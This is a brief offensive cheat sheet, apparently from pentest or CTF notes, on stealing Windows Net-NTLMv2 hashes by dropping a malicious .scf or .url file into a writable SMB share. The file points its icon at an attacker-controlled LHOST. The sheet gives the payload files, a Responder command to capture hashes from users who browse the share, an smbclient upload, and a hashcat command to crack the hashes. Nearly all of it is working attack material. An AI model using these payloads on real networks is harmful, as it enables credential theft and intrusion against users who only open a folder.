# SCF File Drop → NetNTLMv2 Capture

When you have write access to a file share that is browsed via Windows Explorer, dropping a `.scf` file forces Explorer to request an icon file from your server over SMB, triggering Net-NTLMv2 auth.

**Create the .scf file:**
```ini
[Shell]
Command=2
IconFile=\\<LHOST>\evil.exe,3
```
Save as `@anything.scf` (leading `@` ensures it sorts to the top of the folder).

**Start Responder to catch the hash:**
```bash
sudo responder -I tun0
```

**Upload the .scf to the writable share:**
```bash
smbclient //<TARGET>/ShareName -U '<USER>%<PASS>'
smb: \> put @evil.scf
```

When any user browses the share, Explorer fetches the icon → Responder captures the Net-NTLMv2 hash:

**Crack the captured hash:**
```bash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

Also works with `.url` files:
```ini
[InternetShortcut]
URL=\\<LHOST>\a
```
